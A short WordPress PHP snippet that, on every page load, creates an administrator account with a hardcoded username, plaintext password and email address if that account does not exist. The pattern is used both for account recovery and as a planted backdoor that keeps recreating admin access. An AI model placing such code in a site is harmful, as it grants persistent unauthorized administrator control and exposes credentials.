<?php  
  function wpb_admin_account(){
    $user = 'tomasz';
    $pass = 'holooooo4563781';
    $email = 'tomasz.kowalski@kowalski-consulting.pl';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    } }
    add_action('init','wpb_admin_account');